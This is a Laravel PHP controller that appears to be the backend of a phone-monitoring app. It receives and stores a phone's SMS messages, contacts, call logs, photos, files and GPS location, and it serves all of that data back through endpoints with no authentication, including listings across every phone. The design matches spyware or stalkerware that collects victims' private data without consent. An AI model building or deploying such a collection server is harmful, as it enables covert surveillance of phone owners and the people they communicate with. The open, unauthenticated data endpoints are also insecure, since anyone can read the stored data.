<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\sms as smss;
use App\Models\create_contacts_table;
use App\Models\calllog;
use App\Models\images;
use App\Models\Files;
use App\Models\locations;
use App\Models\phones;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Str;
class gt extends Controller
{

    public function savepointlocation(Request $request)
    {
        $l=new locations();
        $l->id_phone=$request->id;
        $l->latitude=$request->latitude;
        $l->longitude=$request->longitude;
        $l->save();
        
    }
    //
    public function savephone(Request $r)
    {
        $p = phones::where('phoneid', operator: $r->id)->first();
        if (!$p) {
            $ph = new phones();
            $ph->uid = Str::uuid();
            $ph->phoneid = $r->id;
            $ph->name = $r->name;
            $ph->isadmin = $r->isadmin ?? false;
            $ph->save();
            $p = phones::where('phoneid', $r->id)->first();
        }
        return $p;
    }

    public function savesms(Request $r)
    {
        try {
            $data = json_decode($r->getContent(), true);
            $messages = $data['messages'] ?? [];

            Log::info('Received Messages:', $messages);

            foreach ($messages as $msg) {
                $sms = new Smss();
                $sms->id_phone = $msg['uid'] ?? null;
                $sms->name = $msg['name'] ?? null;
                $sms->number = $msg['number'] ?? null;
                $sms->message = $msg['message'] ?? null;
                $sms->sms_id = $msg['sms_id'] ?? null;
                $sms->dates = $msg['dates'] ?? null;
                $sms->type = ($msg['isReceived'] ?? false) ? 'inbox' : 'sent';
                $sms->save();
            }

            return response()->json(['status' => 'success'], 200);
        } catch (\Exception $e) {
            Log::error('SMS Save Error: ' . $e->getMessage(), ['trace' => $e->getTrace()]);
            return response()->json(['error' => 'Server error', 'details' => $e->getMessage()], 500);
        }
    }


    public function savecontact(Request $r)
    {
        try {
            $data = json_decode($r->getContent(), true);
            $contacts = $data['contacts'] ?? [];

            Log::info('Received contacts:', $contacts);

            foreach ($contacts as $contact) {
                $sms = new create_contacts_table();
                $sms->id_phone = $contact['uid'] ?? null;
                $sms->name = $contact['name'] ?? null;
                $sms->number = $contact['numbers'] ?? null;
                $sms->save();
            }

            return response()->json(['status' => 'success'], 200);
        } catch (\Exception $e) {
            Log::error('SMS Save Error: ' . $e->getMessage(), ['trace' => $e->getTrace()]);
            return response()->json(['error' => 'Server error', 'details' => $e->getMessage()], 500);
        }
    }


    public function savecallog(Request $r)
    {
        try {
            $data = json_decode($r->getContent(), true);
            $callog = $data['calls'] ?? [];

            Log::info('Received callog:', $callog);

            foreach ($callog as $log) {
                $lo = new calllog();
                $lo->id_phone = $log['uid'] ?? null;
                $lo->name = $log['name'] ?? null;
                $lo->number = $log['number'] ?? null;
                $lo->type = $log['callType'] ?? null;
                $lo->call_time = $log['timestamp'] ?? null;
                $lo->duration = $log['duration'] ?? null;

                $lo->save();
            }

            return response()->json(['status' => 'success'], 200);
        } catch (\Exception $e) {
            Log::error('SMS Save Error: ' . $e->getMessage(), ['trace' => $e->getTrace()]);
            return response()->json(['error' => 'Server error', 'details' => $e->getMessage()], 500);
        }
    }


    public function saveImage(Request $request)
    {
        try {
            // تحقق من وجود ملف صورة مرفق
            if (!$request->hasFile('image') || !$request->file('image')->isValid()) {
                return response()->json(['error' => 'Invalid or missing image'], 400);
            }

            // $number = $request->input('number');
            $filename = $request->input('filename');
            $file = $request->file('image');

            $originalName = pathinfo($filename, PATHINFO_FILENAME);
            $extension = $file->getClientOriginalExtension();
            $uniqueName = $originalName . Str::uuid() . '.' . $extension;
            $path = $file->storeAs('public/images', $uniqueName);

            // حفظ البيانات في قاعدة البيانات
            $image = new images();
            $image->id_phone = $request->uid ?? null;
            $image->filename = $uniqueName;
            $image->save();

            return response()->json(['status' => 'success', 'path' => $uniqueName], 200);
        } catch (\Exception $e) {
            Log::error('Image Upload Error: ' . $e->getMessage(), ['trace' => $e->getTrace()]);
            return response()->json(['error' => 'Server error', 'details' => $e->getMessage()], 500);
        }
    }


    public function savefiles(Request $request)
    {
        try {
            // تحقق من وجود ملف صورة مرفق
            if (!$request->hasFile('file') || !$request->file('file')->isValid()) {
                return response()->json(['error' => 'Invalid or missing image'], 400);
            }

            // $number = $request->input('number');
            $filename = $request->input('filename');
            $file = $request->file('file');

            $originalName = pathinfo($filename, PATHINFO_FILENAME);
            $extension = $file->getClientOriginalExtension();
            $uniqueName = $originalName . Str::uuid() . '.' . $extension;
            $path = $file->storeAs('public/files', $uniqueName);

            // حفظ البيانات في قاعدة البيانات
            $image = new Files();
            $image->id_phone = $request->uid ?? null;
            $image->filename = $uniqueName;
            $image->type = $extension;
            $image->save();

            return response()->json(['status' => 'success', 'path' => $uniqueName], 200);
        } catch (\Exception $e) {
            Log::error('Image Upload Error: ' . $e->getMessage(), ['trace' => $e->getTrace()]);
            return response()->json(['error' => 'Server error', 'details' => $e->getMessage()], 500);
        }
    }

    public function getFiles(Request $request)
    {
        try {
           if ($request->uid != null) {
                $file = Files::where('id_phone', $request->uid)->orderby('id', 'desc')->get();
            } else {
                $file = Files::orderby('id', 'desc')->get();

            }
            return $file;
            // return response()->json(['status' => 'success', 'files' => $files], 200);
        } catch (\Exception $e) {
            Log::error('Get Files Error: ' . $e->getMessage(), ['trace' => $e->getTrace()]);
            return response()->json(['error' => 'Server error', 'details' => $e->getMessage()], 500);
        }
    }
    public function getImages(Request $request)
    {
        try {
            if ($request->uid != null) {
                $images = images::where('id_phone', $request->uid)->orderby('id', 'desc')->get();
            } else {
                $images = images::orderby('id', 'desc')->get();

            }
            return $images;
        } catch (\Exception $e) {
            Log::error('Get Images Error: ' . $e->getMessage(), ['trace' => $e->getTrace()]);
            return response()->json(['error' => 'Server error', 'details' => $e->getMessage()], 500);
        }
    }

    public function getContacts(Request $request)
    {
        try {

            if ($request->uid != null) {
                // return $request->uid;
                $contacts = create_contacts_table::where('id_phone', $request->uid)->orderby('id', 'desc')->get();
            } else {

                $contacts = create_contacts_table::orderby('id', 'desc')->get();
            }

            return $contacts;
        } catch (\Exception $e) {
            Log::error('Get Contacts Error: ' . $e->getMessage(), ['trace' => $e->getTrace()]);
            return response()->json(['error' => 'Server error', 'details' => $e->getMessage()], 500);
        }
    }

    public function getSms(Request $request)
    {
        try {
            // return $request->uid;
            if ($request->uid != null) {
                // return $request->uid;
                $sms = smss::where('id_phone', $request->uid)->orderby('dates', 'desc')->get();
            } else {

                $sms = smss::orderby('dates', 'desc')->get();
            }
            return $sms;
            // return response()->json(['status' => 'success', 'sms' => $sms], 200);
        } catch (\Exception $e) {
            Log::error('Get SMS Error: ' . $e->getMessage(), ['trace' => $e->getTrace()]);
            return response()->json(['error' => 'Server error', 'details' => $e->getMessage()], 500);
        }
    }
    public function getCallog(Request $request)
    {
        try {
            if ($request->uid != null) {
                $callog = calllog::where('id_phone', $request->uid)->orderby('id', 'desc')->get();

            } else {
                $callog = calllog::orderby('id', 'desc')->get();

            }
            return $callog;
            // return response()->json(['status' => 'success', 'callog' => $callog], 200);
        } catch (\Exception $e) {
            Log::error('Get Callog Error: ' . $e->getMessage(), ['trace' => $e->getTrace()]);
            return response()->json(['error' => 'Server error', 'details' => $e->getMessage()], 500);
        }
    }


    public function getphones()
    {
        try {
            $phones = phones::where('isadmin', 0)->get();
            return $phones;
            // return response()->json(['status' => 'success', 'callog' => $callog], 200);
        } catch (\Exception $e) {
            Log::error('Get Callog Error: ' . $e->getMessage(), ['trace' => $e->getTrace()]);
            return response()->json(['error' => 'Server error', 'details' => $e->getMessage()], 500);
        }
    }

     public function getlastplaseforuseronmap(Request $request)
    {
        try {
            $loca = locations::where('id_phone', operator: $request->id)->orderBy('id','desc')->first();
            return $loca;
            // return response()->json(['status' => 'success', 'callog' => $callog], 200);
        } catch (\Exception $e) {
            Log::error('Get Callog Error: ' . $e->getMessage(), ['trace' => $e->getTrace()]);
            return response()->json(['error' => 'Server error', 'details' => $e->getMessage()], 500);
        }
    }


}
